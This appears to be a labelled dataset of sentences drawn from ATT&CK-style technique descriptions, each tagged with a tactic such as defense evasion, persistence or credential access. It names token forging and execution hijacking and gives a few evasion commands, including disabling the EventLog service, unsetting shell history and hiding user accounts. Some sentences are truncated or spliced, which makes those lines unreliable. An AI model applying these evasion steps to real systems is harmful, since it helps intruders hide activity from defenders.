"If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.",CREDENTIAL_ACCESS,,,
An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account.,CREDENTIAL_ACCESS,,,
"This may lead to [Use Alternate Authentication Material], which may bypass multi-factor and other authentication protection mechanisms.",CREDENTIAL_ACCESS,,,
Adversaries may forge web cookies that can be used to gain access to web applications or Internet services.,CREDENTIAL_ACCESS,,,
Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.,CREDENTIAL_ACCESS,,,
Adversaries may generate these cookies in order to gain access to web resources.,CREDENTIAL_ACCESS,,,
"This differs from [Steal Web Session Cookie] and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users.",CREDENTIAL_ACCESS,,,
"Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces., or other cryptographic seed values.",CREDENTIAL_ACCESS,,,
"Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie]), which may bypass multi-factor and other authentication protection mechanisms.",CREDENTIAL_ACCESS,,,
"Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).",RECONNAISSANCE,,,
"Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] or [Phishing for Information].",RECONNAISSANCE,,,
Adversaries may also compromise sites then include malicious content designed to collect host information from visitors..,RECONNAISSANCE,,,
Adversaries may gather information about the victim's client configurations that can be used during targeting.,RECONNAISSANCE,,,
"Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.",RECONNAISSANCE,,,
"Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] (ex: listening ports, server banners, user agent strings) or [Phishing for Information].",RECONNAISSANCE,,,
Adversaries may gather information about the victim's host firmware that can be used during targeting.,RECONNAISSANCE,,,

"Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails.",DEFENSE_EVASION,,,
Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule [PowerShell] cmdlets on Windows systems.,DEFENSE_EVASION,,,

Adversaries may use a hidden file system to conceal malicious activity from users and security tools.,DEFENSE_EVASION,,,
File systems provide a structure to store and access data from physical storage.,DEFENSE_EVASION,,,
"Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector).",DEFENSE_EVASION,,,
"Standard file systems include FAT, NTFS, ext4, and APFS.",DEFENSE_EVASION,,,
"File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.",DEFENSE_EVASION,,,
"Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system.",DEFENSE_EVASION,,,
"In doing so, adversaries can hide the presence of malicious components and file input/output from security tools.",DEFENSE_EVASION,,,
"Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways.",DEFENSE_EVASION,,,
One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.,DEFENSE_EVASION,,,
Adversaries may set files and directories to be hidden to evade detection mechanisms.,DEFENSE_EVASION,,,
"To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file.",DEFENSE_EVASION,,,
These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line.,DEFENSE_EVASION,,,
Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).,DEFENSE_EVASION,,,
"On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name.",DEFENSE_EVASION,,,
"Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”.",DEFENSE_EVASION,,,
Users must specifically change settings to have these files viewable.,DEFENSE_EVASION,,,
"Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app.",DEFENSE_EVASION,,,
"On Windows, users can mark specific files as hidden by using the attrib.exe binary.",DEFENSE_EVASION,,,
Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace.,DEFENSE_EVASION,,,
"For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.",DEFENSE_EVASION,,,
Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.,DEFENSE_EVASION,,,
Adversaries may use hidden users to hide the presence of user accounts they create or modify.,DEFENSE_EVASION,,,
Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.,DEFENSE_EVASION,,,
"In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes.",DEFENSE_EVASION,,,
"To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value Hide500Users to TRUE in the /Library/Preferences/com.apple.loginwindow plist file.",DEFENSE_EVASION,,,
Adversaries may similarly hide user accounts in Windows.,DEFENSE_EVASION,,,
Adversaries can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.,DEFENSE_EVASION,,,
"On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter.",DEFENSE_EVASION,,,
The method an adversary may use depends on which Display Manager the distribution is currently using.,DEFENSE_EVASION,,,
"For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true).",DEFENSE_EVASION,,,
Display Managers are not anchored to specific distributions and may be changed by a user or adversary.,DEFENSE_EVASION,,,
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.,DEFENSE_EVASION,,,
"In some cases, windows that would typically be displayed when an application carries out an operation can be hidden.",DEFENSE_EVASION,,,
This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.,DEFENSE_EVASION,,,
"On Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell], Jscript, and [Visual Basic] to make windows hidden.",DEFENSE_EVASION,,,
One example of this is powershell.exe -WindowStyle Hidden.,DEFENSE_EVASION,,,
"Similarly, on macOS the configurations for how applications run are listed in property list (plist) files.",DEFENSE_EVASION,,,
"One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock.",DEFENSE_EVASION,,,
"A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.",DEFENSE_EVASION,,,
Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.,DEFENSE_EVASION,,,
Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection.,DEFENSE_EVASION,,,
Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.,DEFENSE_EVASION,,,
Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files.,DEFENSE_EVASION,,,
"This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",DEFENSE_EVASION,,,
Adversaries may attempt to hide process command-line arguments by overwriting process memory.,DEFENSE_EVASION,,,
"Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process.",DEFENSE_EVASION,,,
The PEB includes the process command-line arguments that are referenced when executing the process.,DEFENSE_EVASION,,,
"When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.",DEFENSE_EVASION,,,
Adversaries may manipulate a process PEB to evade defenses.,DEFENSE_EVASION,,,
"For example, [Process Hollowing] can be abused to spawn a process in a suspended state with benign arguments.",DEFENSE_EVASION,,,
"After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API] WriteProcessMemory() function) then resume process execution with malicious arguments.",DEFENSE_EVASION,,,
Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.,DEFENSE_EVASION,,,
This behavior may also be combined with other tricks (such as [Parent PID Spoofing]) to manipulate or further evade process-based detections.,DEFENSE_EVASION,,,
Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications.,DEFENSE_EVASION,,,
"A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.",DEFENSE_EVASION,,,
Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files.,DEFENSE_EVASION,,,
"Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked.",DEFENSE_EVASION,,,
Resource fork content may also be obfuscated/encrypted until execution.,DEFENSE_EVASION,,,
Adversaries may carry out malicious operations using a virtual instance to avoid detection.,DEFENSE_EVASION,,,
A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment.,DEFENSE_EVASION,,,
"By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.",DEFENSE_EVASION,,,
"Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.",DEFENSE_EVASION,,,
Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries).,DEFENSE_EVASION,,,
"After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.",DEFENSE_EVASION,,,
Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.,DEFENSE_EVASION,,,
MS Office documents with embedded VBA content store source code inside of module streams.,DEFENSE_EVASION,,,
Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code.,DEFENSE_EVASION,,,
The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.,DEFENSE_EVASION,,,
"An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code.",DEFENSE_EVASION,,,
Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code.,DEFENSE_EVASION,,,
"If the VBA source code is removed, some tools might even think that there are no macros present.",DEFENSE_EVASION,,,
"If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.",DEFENSE_EVASION,,,
Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs.,DEFENSE_EVASION,PERSISTENCE,,
"Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time.",DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.",DEFENSE_EVASION,PERSISTENCE,,
"There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed.",DEFENSE_EVASION,PERSISTENCE,,
How the operating system locates libraries to be used by a program can also be intercepted.,DEFENSE_EVASION,PERSISTENCE,,
"Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.,DEFENSE_EVASION,PERSISTENCE,,
The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).,DEFENSE_EVASION,PERSISTENCE,,
"These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.",DEFENSE_EVASION,PERSISTENCE,,
"The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence.",DEFENSE_EVASION,PERSISTENCE,,
"System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model] (COM) object can be registered as a profiler DLL.",DEFENSE_EVASION,PERSISTENCE,,
A process scope COR_PROFILER can also be created in-memory without modifying the Registry.,DEFENSE_EVASION,PERSISTENCE,,
"Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked.,DEFENSE_EVASION,PERSISTENCE,,
"The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control]) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses] provided by .NET processes.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs.,DEFENSE_EVASION,PERSISTENCE,,
Windows systems use a common method to look for required DLLs to load into a program.,DEFENSE_EVASION,PERSISTENCE,,
Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.,DEFENSE_EVASION,PERSISTENCE,,
There are many ways an adversary can hijack DLL loads.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program.",DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may also perform DLL preloading, also called binary planting attacks,.",DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.",DEFENSE_EVASION,PERSISTENCE,,
"If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level.",DEFENSE_EVASION,PERSISTENCE,,
"In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.",DEFENSE_EVASION,PERSISTENCE,,
Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by side-loading DLLs.,DEFENSE_EVASION,PERSISTENCE,,
"Similar to [DLL Search Order Hijacking], side-loading involves hijacking which DLL a program loads.",DEFENSE_EVASION,PERSISTENCE,,
"But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).",DEFENSE_EVASION,PERSISTENCE,,
Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process.",DEFENSE_EVASION,PERSISTENCE,,
Benign executables used to side-load payloads may not be flagged during delivery and/or execution.,DEFENSE_EVASION,PERSISTENCE,,
Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime.,DEFENSE_EVASION,PERSISTENCE,,
The dynamic loader will try to find the dylibs based on the sequential order of the search paths.,DEFENSE_EVASION,PERSISTENCE,,
"Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.",DEFENSE_EVASION,PERSISTENCE,,
"Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present.",DEFENSE_EVASION,PERSISTENCE,,
Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.,DEFENSE_EVASION,PERSISTENCE,,
"During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS.",DEFENSE_EVASION,PERSISTENCE,,
"Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.",DEFENSE_EVASION,PERSISTENCE,,
"On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",DEFENSE_EVASION,PERSISTENCE,,
This method may also evade detection from security products since the execution is masked under a legitimate process.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries can also leverage [Dynamic Linker Hijacking] to export variables in a shell or set variables programmatically using higher level syntax such Python’s os.environ.,DEFENSE_EVASION,PERSISTENCE,,
"On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.",DEFENSE_EVASION,PERSISTENCE,,
LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file.,DEFENSE_EVASION,PERSISTENCE,,
"On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries can set the DYLD_INSERT_LIBRARIES environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer.,DEFENSE_EVASION,PERSISTENCE,,
These processes may automatically execute specific binaries as part of their functionality or to perform other actions.,DEFENSE_EVASION,PERSISTENCE,,
"If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process.",DEFENSE_EVASION,PERSISTENCE,,
"If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.",DEFENSE_EVASION,PERSISTENCE,,
"Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers.",DEFENSE_EVASION,PERSISTENCE,,
"During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads.",DEFENSE_EVASION,PERSISTENCE,,
"When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process.",DEFENSE_EVASION,PERSISTENCE,,
This behavior is related to and may take advantage of [DLL Search Order Hijacking].,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.,DEFENSE_EVASION,PERSISTENCE,,
Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code.,DEFENSE_EVASION,PERSISTENCE,,
This behavior is related to [Bypass User Account Control].,DEFENSE_EVASION,PERSISTENCE,,
Several examples of this weakness in existing common installers have been reported to software vendors. then this technique can also be used for persistence.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads.,DEFENSE_EVASION,PERSISTENCE,,
An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload.,DEFENSE_EVASION,PERSISTENCE,,
Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading] or [Process Injection] into another process.,DEFENSE_EVASION,PERSISTENCE,,
A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() [Native API] function).,DEFENSE_EVASION,PERSISTENCE,,
The tampered function is typically invoked using a Windows message.,DEFENSE_EVASION,PERSISTENCE,,
"After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload.",DEFENSE_EVASION,PERSISTENCE,,
Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.",DEFENSE_EVASION,PERSISTENCE,,
The PATH environment variable contains a list of directories.,DEFENSE_EVASION,PERSISTENCE,,
Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given.,DEFENSE_EVASION,PERSISTENCE,,
"If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.",DEFENSE_EVASION,PERSISTENCE,,
"For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.,DEFENSE_EVASION,PERSISTENCE,,
"Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.",DEFENSE_EVASION,PERSISTENCE,,
Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path.,DEFENSE_EVASION,PERSISTENCE,,
"Unlike [DLL Search Order Hijacking], the search order differs depending on the method that is used to execute the program. may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.",DEFENSE_EVASION,PERSISTENCE,,
"For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument net user.",DEFENSE_EVASION,PERSISTENCE,,
"An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net.",DEFENSE_EVASION,PERSISTENCE,,
"In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then cmd.exe /C net user will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.",DEFENSE_EVASION,PERSISTENCE,,
Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking].,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking vulnerable file path references.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.",DEFENSE_EVASION,PERSISTENCE,,
Service paths.,DEFENSE_EVASION,PERSISTENCE,,
"This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking the binaries used by services.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start.,DEFENSE_EVASION,PERSISTENCE,,
These service processes may automatically execute specific binaries as part of their functionality or to perform other actions.,DEFENSE_EVASION,PERSISTENCE,,
"If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process.",DEFENSE_EVASION,PERSISTENCE,,
"If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts.",DEFENSE_EVASION,PERSISTENCE,,
Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services.,DEFENSE_EVASION,PERSISTENCE,,
"The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell], or [Reg].",DEFENSE_EVASION,PERSISTENCE,,
Access to Registry keys is controlled through access control lists and user permissions.,DEFENSE_EVASION,PERSISTENCE,,
"If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control.",DEFENSE_EVASION,PERSISTENCE,,
"When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may also alter other Registry keys in the service’s Registry tree.,DEFENSE_EVASION,PERSISTENCE,,
"For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.",DEFENSE_EVASION,PERSISTENCE,,
The Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.,DEFENSE_EVASION,,,
"This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior.",DEFENSE_EVASION,,,
This may also span both native defenses as well as supplemental capabilities installed by users and administrators.,DEFENSE_EVASION,,,
"Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",DEFENSE_EVASION,,,
An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection.,DEFENSE_EVASION,,,
Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment.,DEFENSE_EVASION,,,
"If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities.",DEFENSE_EVASION,,,
"For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.",DEFENSE_EVASION,,,
Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits.,DEFENSE_EVASION,,,
"Windows event logs record user and system activity such as login attempts, process creation, and much more.",DEFENSE_EVASION,,,
This data is used by security tools and analysts to generate detections.,DEFENSE_EVASION,,,
The EventLog service maintains event logs from various system components and applications.,DEFENSE_EVASION,,,
Adversaries may target system-wide logging or just that of a particular application.,DEFENSE_EVASION,,,
"For example, the EventLog service may be disabled using the following PowerShell line: Stop-Service -Name EventLog.",DEFENSE_EVASION,,,
"By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",DEFENSE_EVASION,,,
Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources.,DEFENSE_EVASION,,,
Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall].,DEFENSE_EVASION,,,
Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols.,DEFENSE_EVASION,,,
An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment.,DEFENSE_EVASION,,,
"For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.",DEFENSE_EVASION,,,
"Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",DEFENSE_EVASION,,,
Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage.,DEFENSE_EVASION,,,
"Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules.",DEFENSE_EVASION,,,
"This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.",DEFENSE_EVASION,,,
"Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",DEFENSE_EVASION,,,
Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.,DEFENSE_EVASION,,,
"This may take the many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information.",DEFENSE_EVASION,,,
Adversaries may also tamper with artifacts deployed and utilized by security tools.,DEFENSE_EVASION,,,
Security tools may make dynamic changes to system components in order to maintain visibility into specific events.,DEFENSE_EVASION,,,
"For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection.",DEFENSE_EVASION,,,
"Similar to [Indicator Blocking], adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.",DEFENSE_EVASION,,,
"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging.",DEFENSE_EVASION,,,
"For example, [PowerShell] versions 5+ includes Script Block Logging (SBL) which can record executed script content.",DEFENSE_EVASION,,,
"However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses] while running malicious scripts that may have otherwise been detected.",DEFENSE_EVASION,,,
"Adversaries may downgrade and use less-secure versions of various features of a system, such as [Command and Scripting Interpreter]s or even network protocols that can be abused to enable [Adversary-in-the-Middle].",DEFENSE_EVASION,,,
Adversaries may impair command history logging to hide commands they run on a compromised system.,DEFENSE_EVASION,,,
Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.,DEFENSE_EVASION,,,
"On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE.",DEFENSE_EVASION,,,
"When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history.",DEFENSE_EVASION,,,
The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out.,DEFENSE_EVASION,,,
"HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected.",DEFENSE_EVASION,,,
Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands.,DEFENSE_EVASION,,,
"Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"".",DEFENSE_EVASION,,,
"HISTCONTROL can also be set to ignore duplicate commands by setting it to ""ignoredups"".",DEFENSE_EVASION,,,
